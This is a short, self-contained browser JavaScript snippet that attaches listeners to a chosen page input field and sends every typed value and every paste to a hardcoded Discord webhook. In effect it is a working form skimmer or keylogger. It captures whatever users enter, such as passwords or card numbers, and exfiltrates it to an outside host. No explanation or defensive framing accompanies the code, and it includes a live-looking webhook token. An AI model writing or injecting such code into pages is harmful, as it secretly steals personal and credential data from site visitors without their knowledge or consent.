(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1510600905853108315/gg6Evk5crnNyA7BA6f6wCyObrc0n_OMutzwSLscFmpdn9WkpizHP1iN_KN4fjIQW1685";

    async function sendData(content) {
        try {
            await fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: content })
            });
            console.log("✅ Sent to webhook");
        } catch(e) {
            console.error("❌ Failed to send");
        }
    }

    function attachToField(selector) {
        const field = document.querySelector(selector);
        if (!field) return console.error("Field not found:", selector);

        let oldValue = field.value;
        field.addEventListener("input", () => {
            let newValue = field.value;
            if (newValue !== oldValue) {
                sendData(`[INPUT] ${newValue}`);
                oldValue = newValue;
            }
        });

        field.addEventListener("paste", () => {
            setTimeout(() => {
                sendData(`[PASTE] ${field.value}`);
            }, 10);
        });
    }

    window.attachToField = attachToField;
})();
